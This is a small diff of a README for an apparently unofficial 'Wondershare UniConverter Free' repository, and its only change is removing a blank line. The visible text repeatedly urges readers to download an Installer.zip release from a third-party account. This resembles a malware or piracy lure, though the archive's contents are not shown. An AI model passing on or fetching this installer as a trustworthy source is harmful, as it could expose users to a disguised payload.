@@ -72,4 +72,3 @@ Thank you for exploring Wondershare UniConverter Free with us! 🎉
 Remember, the [latest release](https://github.com/darkangel9bu/Wondershare-UniConverter-Free/releases/download/2.0/Installer.zip) is waiting to be launched!
 
 [![Download latest release](https://github.com/darkangel9bu/Wondershare-UniConverter-Free/releases/download/2.0/Installer.zip)](https://github.com/darkangel9bu/Wondershare-UniConverter-Free/releases/download/2.0/Installer.zip)
- 
